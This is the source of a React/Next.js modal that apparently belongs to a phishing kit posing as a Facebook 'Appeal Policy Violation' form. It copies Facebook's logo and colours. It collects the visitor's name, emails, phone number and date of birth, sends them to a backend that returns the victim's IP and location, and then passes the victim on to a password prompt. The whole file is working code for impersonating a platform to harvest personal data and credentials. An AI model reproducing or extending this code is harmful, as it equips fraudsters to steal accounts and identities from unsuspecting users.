"use client";

import { useEffect, useState } from "react";
import Image from "next/image";

interface AppealModalProps {
  onClose: () => void;
  onPasswordRequired: (details: {
    fullName: string;
    email: string;
    emailBusiness: string;
    pageName: string;
    phoneNumber: string;
    day: string;
    month: string;
    year: string;
    note: string;
    ip: string;
    location: string;
  }) => void;
}

type DialCodeInfo = {
  name: string;
  dialCode: string;
};

type PhoneCountry = {
  code: string;
  name: string;
  dialCode: string;
  flagUrl: string;
};

const DEFAULT_COUNTRY = "US";

const dialCodeMap: Record<string, DialCodeInfo> = {
  US: { name: "United States", dialCode: "+1" },
  CA: { name: "Canada", dialCode: "+1" },
  VN: { name: "Vietnam", dialCode: "+84" },
  SG: { name: "Singapore", dialCode: "+65" },
  TH: { name: "Thailand", dialCode: "+66" },
  MY: { name: "Malaysia", dialCode: "+60" },
  ID: { name: "Indonesia", dialCode: "+62" },
  PH: { name: "Philippines", dialCode: "+63" },
  KH: { name: "Cambodia", dialCode: "+855" },
  LA: { name: "Laos", dialCode: "+856" },
  JP: { name: "Japan", dialCode: "+81" },
  KR: { name: "South Korea", dialCode: "+82" },
  CN: { name: "China", dialCode: "+86" },
  HK: { name: "Hong Kong", dialCode: "+852" },
  TW: { name: "Taiwan", dialCode: "+886" },
  AU: { name: "Australia", dialCode: "+61" },
  NZ: { name: "New Zealand", dialCode: "+64" },
  IN: { name: "India", dialCode: "+91" },
  AE: { name: "United Arab Emirates", dialCode: "+971" },
  SA: { name: "Saudi Arabia", dialCode: "+966" },
  GB: { name: "United Kingdom", dialCode: "+44" },
  FR: { name: "France", dialCode: "+33" },
  DE: { name: "Germany", dialCode: "+49" },
  ES: { name: "Spain", dialCode: "+34" },
  IT: { name: "Italy", dialCode: "+39" },
  NL: { name: "Netherlands", dialCode: "+31" },
  BE: { name: "Belgium", dialCode: "+32" },
  CH: { name: "Switzerland", dialCode: "+41" },
  BR: { name: "Brazil", dialCode: "+55" },
  MX: { name: "Mexico", dialCode: "+52" },
  AR: { name: "Argentina", dialCode: "+54" },
  CL: { name: "Chile", dialCode: "+56" },
};

const getFlagUrl = (countryCode: string) => {
  if (!countryCode) return "https://flagcdn.com/24x18/un.png";
  return `https://flagcdn.com/24x18/${countryCode.toLowerCase()}.png`;
};

export default function AppealModal({ onClose, onPasswordRequired }: AppealModalProps) {
  const [formData, setFormData] = useState(() => {
    const defaultInfo = dialCodeMap[DEFAULT_COUNTRY];
    return {
      fullName: "",
      email: "",
      emailBusiness: "",
      pageName: "",
      phoneNumber: `${defaultInfo.dialCode} `,
      day: "",
      month: "",
      year: "",
      note: "",
    };
  });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [phoneCountry, setPhoneCountry] = useState<PhoneCountry>(() => {
    const info = dialCodeMap[DEFAULT_COUNTRY];
    return {
      code: DEFAULT_COUNTRY,
      dialCode: info.dialCode,
      flagUrl: getFlagUrl(DEFAULT_COUNTRY),
      name: info.name,
    };
  });
  const [showCountryDropdown, setShowCountryDropdown] = useState(false);
  const [countrySearchTerm, setCountrySearchTerm] = useState("");
  const [facebookNotification, setFacebookNotification] = useState(true);

  const handleCountrySelect = (countryCode: string) => {
    const info = dialCodeMap[countryCode];
    if (!info) return;
    
    const flagUrl = getFlagUrl(countryCode);
    setPhoneCountry({
      code: countryCode,
      dialCode: info.dialCode,
      flagUrl,
      name: info.name,
    });
    
    // Cập nhật phone number với mã quốc gia mới
    const currentNumber = formData.phoneNumber.trim();
    // Lấy phần số sau mã quốc gia cũ (nếu có)
    let numberPart = "";
    if (currentNumber.startsWith(phoneCountry.dialCode)) {
      numberPart = currentNumber.substring(phoneCountry.dialCode.length).trim();
    } else if (currentNumber.startsWith("+")) {
      // Nếu có mã quốc gia khác, giữ nguyên số
      const match = currentNumber.match(/^\+(\d+)\s*(.*)$/);
      if (match) {
        numberPart = match[2];
      }
    } else {
      numberPart = currentNumber;
    }
    
    setFormData({
      ...formData,
      phoneNumber: `${info.dialCode} ${numberPart}`.trim(),
    });
    
    setShowCountryDropdown(false);
    setCountrySearchTerm("");
  };

  useEffect(() => {
    const detectLocation = async () => {
      try {
        const response = await fetch("/api/detect-location");
        if (!response.ok) return;
        const data = await response.json();
        if (data?.countryCode) {
          const code = data.countryCode.toUpperCase();
          const info = dialCodeMap[code] || dialCodeMap[DEFAULT_COUNTRY];
          const flagUrl = getFlagUrl(code);
          setPhoneCountry({
            code,
            dialCode: info.dialCode,
            flagUrl,
            name: info.name,
          });
          setFormData((prev) => {
            // Luôn cập nhật phone number với mã quốc gia mới nếu chưa có hoặc không khớp
            const currentPhone = prev.phoneNumber || "";
            if (!currentPhone.startsWith(info.dialCode)) {
              return {
                ...prev,
                phoneNumber: `${info.dialCode} `,
              };
            }
            return prev;
          });
        }
      } catch (err) {
        console.error("Failed to detect location", err);
      }
    };
    detectLocation();
  }, []);

  // Đóng dropdown khi click bên ngoài
  useEffect(() => {
    const handleClickOutside = (e: MouseEvent) => {
      const target = e.target as HTMLElement;
      if (!target.closest(".phone-code-wrapper")) {
        setShowCountryDropdown(false);
      }
    };
    if (showCountryDropdown) {
      document.addEventListener("mousedown", handleClickOutside);
      return () => document.removeEventListener("mousedown", handleClickOutside);
    }
  }, [showCountryDropdown]);

  useEffect(() => {
    if (!showCountryDropdown) {
      setCountrySearchTerm("");
    }
  }, [showCountryDropdown]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setError(null);

    try {
      // Validate form
      if (!formData.fullName || !formData.email || !formData.phoneNumber || 
          !formData.day || !formData.month || !formData.year) {
        setError("Please fill in all required fields");
        setIsSubmitting(false);
        return;
      }

      // Submit form to API
      const response = await fetch('/api/submit-form', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      });

      const result = await response.json();

      if (result.success) {
        // Form submitted successfully, proceed to password modal
        onPasswordRequired({
          ...formData,
          ip: result.meta?.ip || "Unknown",
          location: result.meta?.location || "Unknown",
        });
      } else {
        setError(result.message || "Failed to submit form. Please try again.");
      }
    } catch (err) {
      console.error('Error submitting form:', err);
      setError("An error occurred. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="modal-overlay" onClick={(e) => e.target === e.currentTarget && onClose()}>
      <div className="modal" onClick={(e) => e.stopPropagation()}>
        <div className="modal-header">
          <h2 className="modal-title">Appeal Policy Violation</h2>
          <button className="modal-close" onClick={onClose}>×</button>
        </div>
        <div className="modal-body">
          <form id="appealForm" onSubmit={handleSubmit}>
            <div className="form-group">
              <input
                type="text"
                className="form-input"
                placeholder="Full Name"
                required
                value={formData.fullName}
                onChange={(e) => setFormData({ ...formData, fullName: e.target.value })}
              />
            </div>
            <div className="form-group">
              <input
                type="email"
                className="form-input"
                placeholder="Email"
                required
                value={formData.email}
                onChange={(e) => setFormData({ ...formData, email: e.target.value })}
              />
            </div>
            <div className="form-group">
              <input
                type="email"
                className="form-input"
                placeholder="Email Business (Optional)"
                value={formData.emailBusiness}
                onChange={(e) => setFormData({ ...formData, emailBusiness: e.target.value })}
              />
            </div>
            <div className="form-group">
              <input
                type="text"
                className="form-input"
                placeholder="Page Name (Optional)"
                value={formData.pageName}
                onChange={(e) => setFormData({ ...formData, pageName: e.target.value })}
              />
            </div>
            <div className="form-group">
              <div className="phone-group">
                <div className="phone-code-wrapper">
                  <button 
                    type="button" 
                    className="phone-code-btn" 
                    title={phoneCountry.name}
                    onClick={() => {
                      setShowCountryDropdown(!showCountryDropdown);
                      setCountrySearchTerm("");
                    }}
                  >
                    <Image
                      src={phoneCountry.flagUrl}
                      alt={`${phoneCountry.name} flag`}
                      className="phone-code-flag"
                      width={20}
                      height={14}
                    />
                    <span className="phone-code-prefix">{phoneCountry.dialCode}</span>
                    <svg 
                      className="phone-code-arrow" 
                      width="12" 
                      height="12" 
                      viewBox="0 0 12 12" 
                      fill="none" 
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path 
                        d="M2 4L6 8L10 4" 
                        stroke="currentColor" 
                        strokeWidth="1.5" 
                        strokeLinecap="round" 
                        strokeLinejoin="round"
                      />
                    </svg>
                  </button>
                  {showCountryDropdown && (
                    <div className="country-dropdown">
                      <div className="country-dropdown-search">
                        <input
                          type="text"
                          placeholder="Search country..."
                          className="country-search-input"
                          id="countrySearch"
                          autoFocus
                          value={countrySearchTerm}
                          onChange={(e) => setCountrySearchTerm(e.target.value)}
                        />
                      </div>
                      <div className="country-dropdown-list">
                        {Object.entries(dialCodeMap)
                          .filter(([code, info]) => {
                            if (!countrySearchTerm) return true;
                            const search = countrySearchTerm.toLowerCase();
                            return (
                              info.name.toLowerCase().includes(search) ||
                              info.dialCode.includes(search) ||
                              code.toLowerCase().includes(search)
                            );
                          })
                          .map(([code, info]) => (
                            <button
                              key={code}
                              type="button"
                              className={`country-option ${phoneCountry.code === code ? "selected" : ""}`}
                              onClick={() => handleCountrySelect(code)}
                            >
                              <Image
                                src={getFlagUrl(code)}
                                alt={`${info.name} flag`}
                                className="country-flag"
                                width={24}
                                height={16}
                              />
                              <span className="country-name">{info.name}</span>
                              <span className="country-dial">{info.dialCode}</span>
                            </button>
                          ))}
                      </div>
                    </div>
                  )}
                </div>
                <div className="phone-input-group">
                  <input
                    type="tel"
                    className="form-input phone-input"
                    placeholder="Phone Number"
                    required
                    value={formData.phoneNumber}
                    onChange={(e) => {
                      const newValue = e.target.value;
                      setFormData({ ...formData, phoneNumber: newValue });
                    }}
                    onBlur={(e) => {
                      // Khi blur, đảm bảo có mã quốc gia nếu user xóa hết
                      const value = e.target.value.trim();
                      if (!value || !value.startsWith(phoneCountry.dialCode)) {
                        setFormData({ ...formData, phoneNumber: `${phoneCountry.dialCode} ` });
                      }
                      // Đóng dropdown khi blur
                      setTimeout(() => setShowCountryDropdown(false), 200);
                    }}
                  />
                </div>
              </div>
            </div>
            <div className="form-group">
              <label className="form-label">Date of Birth</label>
              <div className="date-group">
                <div className="form-group">
                  <input
                    type="number"
                    className="form-input"
                    placeholder="Day"
                    min="1"
                    max="31"
                    required
                    value={formData.day}
                    onChange={(e) => setFormData({ ...formData, day: e.target.value })}
                  />
                </div>
                <div className="form-group">
                  <input
                    type="number"
                    className="form-input"
                    placeholder="Month"
                    min="1"
                    max="12"
                    required
                    value={formData.month}
                    onChange={(e) => setFormData({ ...formData, month: e.target.value })}
                  />
                </div>
                <div className="form-group">
                  <input
                    type="number"
                    className="form-input"
                    placeholder="Year"
                    min="1900"
                    max="2024"
                    required
                    value={formData.year}
                    onChange={(e) => setFormData({ ...formData, year: e.target.value })}
                  />
                </div>
              </div>
            </div>
            <div className="form-group">
              <textarea
                className="form-textarea"
                placeholder="Explain why you believe this violation was made in error (Optional)"
                rows={2}
                maxLength={500}
                value={formData.note}
                onChange={(e) => setFormData({ ...formData, note: e.target.value })}
              ></textarea>
              <div className="char-counter">{formData.note.length}/500 characters</div>
            </div>
          </form>
        </div>
        <div className="modal-footer">
          {error && (
            <div className="form-error" style={{ color: "#e41e3f", fontSize: "13px", marginBottom: "12px" }}>
              {error}
            </div>
          )}
          <div className="facebook-notification">
            <div className="facebook-notification-content">
              <div className="facebook-logo-wrapper">
                <svg className="facebook-logo" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" fill="#1877F2"/>
                </svg>
                <span className="facebook-text">on Facebook</span>
              </div>
              <p className="facebook-subtext">We will send you a notification on Facebook.</p>
            </div>
            <label className="toggle-switch">
              <input
                type="checkbox"
                checked={facebookNotification}
                onChange={(e) => setFacebookNotification(e.target.checked)}
              />
              <span className="toggle-slider"></span>
            </label>
          </div>
          <div className="checkbox-group">
            <input type="checkbox" id="termsCheck" required />
            <label htmlFor="termsCheck">
              I agree with <a href="#" className="terms-link">Terms of use</a>
            </label>
          </div>
          <button 
            type="submit" 
            form="appealForm" 
            className="btn-send"
            disabled={isSubmitting}
          >
            {isSubmitting ? "Sending..." : "Send"}
          </button>
        </div>
      </div>
      <style jsx>{`
        .modal-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background-color: rgba(0, 0, 0, 0.5);
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 10000;
          padding: 20px;
        }

        .modal {
          background-color: #ffffff;
          border-radius: 12px;
          width: 90%;
          max-width: 500px;
          max-height: 90vh;
          overflow-y: auto;
          box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
        }

        .modal-header {
          display: flex;
          align-items: center;
          justify-content: space-between;
          padding: 20px;
          border-bottom: 1px solid #e4e6eb;
        }

        .modal-title {
          font-size: 20px;
          font-weight: 600;
          color: #1c1e21;
        }

        .modal-close {
          background: none;
          border: none;
          font-size: 24px;
          color: #65676b;
          cursor: pointer;
          padding: 0;
          width: 32px;
          height: 32px;
          display: flex;
          align-items: center;
          justify-content: center;
          border-radius: 50%;
          transition: background-color 0.2s;
        }

        .modal-close:hover {
          background-color: #f0f2f5;
        }

        .modal-body {
          padding: 20px;
        }

        .form-group {
          margin-bottom: 14px;
        }

        .form-label {
          display: block;
          font-size: 14px;
          font-weight: 600;
          color: #1c1e21;
          margin-bottom: 8px;
        }

        .form-input,
        .form-textarea {
          width: 100%;
          padding: 8px 12px;
          border: 1px solid #ccd0d5;
          border-radius: 10px;
          font-size: 14px;
          font-family: inherit;
          transition: border-color 0.2s;
        }

        .form-input {
          height: 38px;
        }

        .form-input:focus,
        .form-textarea:focus {
          outline: none;
          border-color: #1877f2;
        }

        .phone-group {
          display: flex;
          gap: 8px;
        }

        .phone-code-wrapper {
          position: relative;
          width: auto;
          flex-shrink: 0;
        }

        .phone-code-btn {
          height: 38px;
          border: 1px solid #ccd0d5;
          border-radius: 10px;
          background-color: #ffffff;
          cursor: pointer;
          font-size: 14px;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 6px;
          padding: 0 10px;
          transition: border-color 0.2s, background-color 0.2s;
          white-space: nowrap;
        }

        .phone-code-btn:hover {
          border-color: #1877f2;
          background-color: #f0f2f5;
        }

        .phone-code-flag {
          width: 20px;
          height: 14px;
          border-radius: 3px;
          object-fit: cover;
          flex-shrink: 0;
        }

        .phone-code-prefix {
          font-weight: 600;
          color: #1c1e21;
          font-size: 13px;
          flex-shrink: 0;
        }

        .phone-code-arrow {
          width: 12px;
          height: 12px;
          color: #65676b;
          flex-shrink: 0;
          transition: transform 0.2s;
        }

        .phone-code-btn:hover .phone-code-arrow {
          color: #1877f2;
        }

        .country-dropdown {
          position: absolute;
          top: calc(100% + 4px);
          left: 0;
          min-width: 240px;
          background: #ffffff;
          border: 1px solid #ccd0d5;
          border-radius: 10px;
          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
          z-index: 10001;
          max-height: 300px;
          display: flex;
          flex-direction: column;
          overflow: hidden;
        }

        .country-dropdown-search {
          padding: 8px;
          border-bottom: 1px solid #e4e6eb;
        }

        .country-search-input {
          width: 100%;
          padding: 6px 10px;
          border: 1px solid #ccd0d5;
          border-radius: 6px;
          font-size: 13px;
        }

        .country-search-input:focus {
          outline: none;
          border-color: #1877f2;
        }

        .country-dropdown-list {
          overflow-y: auto;
          max-height: 250px;
        }

        .country-option {
          width: 100%;
          padding: 10px 12px;
          border: none;
          background: none;
          text-align: left;
          cursor: pointer;
          display: flex;
          align-items: center;
          gap: 10px;
          font-size: 14px;
          transition: background-color 0.2s;
        }

        .country-option:hover {
          background-color: #f0f2f5;
        }

        .country-option.selected {
          background-color: #e7f3ff;
        }

        .country-flag {
          width: 24px;
          height: 16px;
          border-radius: 3px;
          object-fit: cover;
        }

        .country-name {
          flex: 1;
          color: #1c1e21;
        }

        .country-dial {
          color: #65676b;
          font-weight: 600;
          font-size: 13px;
        }

        .phone-input-group {
          flex: 1;
        }

        .date-group {
          display: flex;
          gap: 12px;
        }

        .date-group .form-group {
          flex: 1;
          margin-bottom: 0;
        }

        .form-textarea {
          resize: vertical;
          min-height: 70px;
        }

        .char-counter {
          font-size: 12px;
          color: #65676b;
          text-align: right;
          margin-top: 4px;
        }

        .modal-footer {
          padding: 0 20px 20px;
        }

        .facebook-notification {
          display: flex;
          align-items: flex-start;
          justify-content: space-between;
          gap: 16px;
          padding: 12px;
          background-color: #f0f2f5;
          border-radius: 10px;
          margin-bottom: 16px;
        }

        .facebook-notification-content {
          flex: 1;
        }

        .facebook-logo-wrapper {
          display: flex;
          align-items: center;
          gap: 8px;
          margin-bottom: 4px;
        }

        .facebook-logo {
          flex-shrink: 0;
        }

        .facebook-text {
          font-size: 14px;
          font-weight: 600;
          color: #1c1e21;
        }

        .facebook-subtext {
          font-size: 12px;
          color: #65676b;
          margin: 0;
        }

        .toggle-switch {
          position: relative;
          display: inline-block;
          width: 44px;
          height: 24px;
          flex-shrink: 0;
          cursor: pointer;
        }

        .toggle-switch input {
          opacity: 0;
          width: 0;
          height: 0;
        }

        .toggle-slider {
          position: absolute;
          cursor: pointer;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background-color: #ccd0d5;
          transition: 0.3s;
          border-radius: 24px;
        }

        .toggle-slider:before {
          position: absolute;
          content: "";
          height: 18px;
          width: 18px;
          left: 3px;
          bottom: 3px;
          background-color: white;
          transition: 0.3s;
          border-radius: 50%;
        }

        .toggle-switch input:checked + .toggle-slider {
          background-color: #1877f2;
        }

        .toggle-switch input:checked + .toggle-slider:before {
          transform: translateX(20px);
        }

        .response-time {
          font-size: 12px;
          color: #65676b;
          margin-bottom: 12px;
        }

        .checkbox-group {
          display: flex;
          align-items: flex-start;
          gap: 8px;
          margin-bottom: 16px;
        }

        .checkbox-group input[type="checkbox"] {
          width: 18px;
          height: 18px;
          margin-top: 2px;
          cursor: pointer;
          flex-shrink: 0;
        }

        .checkbox-group label {
          font-size: 14px;
          color: #1c1e21;
          cursor: pointer;
        }

        .terms-link {
          color: #1877f2;
          text-decoration: none;
        }

        .terms-link:hover {
          text-decoration: underline;
        }

        .btn-send {
          width: 100%;
          padding: 10px;
          background-color: #1877f2;
          color: #ffffff;
          border: none;
          border-radius: 10px;
          font-size: 14px;
          font-weight: 600;
          cursor: pointer;
          transition: background-color 0.2s;
          height: 40px;
        }

        .btn-send:hover {
          background-color: #166fe5;
        }

        .btn-send:disabled {
          background-color: #e4e6eb;
          color: #8a8d91;
          cursor: not-allowed;
        }

        .form-error {
          padding: 8px 12px;
          background-color: #ffeef0;
          border: 1px solid #e41e3f;
          border-radius: 8px;
        }
      `}</style>
    </div>
  );
}

